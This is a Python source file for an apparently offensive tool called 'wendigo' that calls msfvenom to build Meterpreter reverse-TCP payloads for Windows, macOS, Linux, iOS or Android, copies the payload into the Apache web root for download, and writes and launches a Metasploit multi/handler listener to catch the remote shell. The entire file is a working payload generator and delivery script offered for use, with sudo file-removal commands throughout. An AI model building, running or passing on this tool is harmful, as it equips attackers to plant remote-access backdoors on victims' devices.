from datetime import datetime
import time
import gui
import os
host = ""
now = datetime.now()
current_time = now.strftime("%H:%M:%S")
def wendigo():
    os.system('hostname -I > ip.txt')
    with open('ip.txt') as ip:
        host = ip.readlines(1)
        host = str(host[0])
        host = str(host.replace('\n',''))
        host = str(host.replace(' ',''))
    os.system('sudo rm -r ip.txt')
    print(gui.banner)
    print(gui.menu)
    option = input(f'[INPUT] {current_time} Option: ')
    if option == "1":
        payload = "windows/meterpreter/reverse_tcp"
    if option == "2":
        payload = "osx/x64/meterpreter_reverse_tcp"
    if option == "3":
        payload = "linux/x64/meterpreter_reverse_tcp"
    if option == "4":
        payload = "apple_ios/aarch64/meterpreter_reverse_tcp"
    if option == "5":
        payload = "android/meterpreter/reverse_tcp"
    payloadname = input(f'[INPUT] {current_time} Payload Name: ')
    if payloadname == "":
        print(f"[ERROR] {current_time} Payload Name can't be blank")
        exit()
    else:
        payloadname = str(payloadname)
    targetip = input(f'[INPUT] {current_time} Payload Target IP (Default: {host}): ')
    if str(targetip) == "":
        targetip = str(host)
    else:
        targetip = str(targetip)
    targetport = input(f'[INPUT] {current_time} Payload Target Port (Default: 4200): ')
    if str(targetport) == "":
        targetport = 4200
    else:
        targetport = int(targetport)
    command = str(f'msfvenom -p {payload} LHOST={targetip} LPORT={targetport} -f exe -o payloads/{payloadname}.exe > /dev/null 2>&1')
    print(f'[INFO] {current_time} Generating Payload...')
    os.system(command)
    time.sleep(3)
    print(f'[INFO] {current_time} Uploading Payload...')
    os.system('sudo service apache2 start > /dev/null 2>&1')
    command2 = str(f'sudo cp payloads/{payloadname}.exe /var/www/html')
    os.system(command2)
    os.system('sudo service apache2 restart > /dev/null 2>&1')
    time.sleep(2)
    print(f'[INFO] {current_time} Payload Availible At {host}/{payloadname}.exe')
    listener = input(f'[INPUT] {current_time} Start Metasploit Listener? [Y/n]: ')
    if listener == "y" or listener == "Y" or listener == "yes" or listener == "Yes":
        os.system('sudo rm -r wendigo.rc')
        os.system('printf "use multi/handler\n" >> wendigo.rc')
        write1 = str(f'printf "set payload {payload}\n" >> wendigo.rc')
        os.system(write1)
        write2 = str(f'printf "set lhost {targetip}\n" >> wendigo.rc')
        os.system(write2)
        write3 = str(f'printf "set lport {targetport}\n" >> wendigo.rc')
        os.system(write3)
        os.system('printf "exploit" >> wendigo.rc')
        os.system('sudo msfconsole -r wendigo.rc')
    if listener == "n" or listener == "N" or listener == "no" or listener == "No":
        print(f"[INFO] {current_time} Exitting...")
    else:
        print(f"[ERROR] {current_time} Unknown Input, Exitting...")
if __name__ == "__main__":
    try:
        wendigo()
    except KeyboardInterrupt:
        print(f"\n[ERROR] {current_time} KeyboardInterupt Detected, Exiting...")
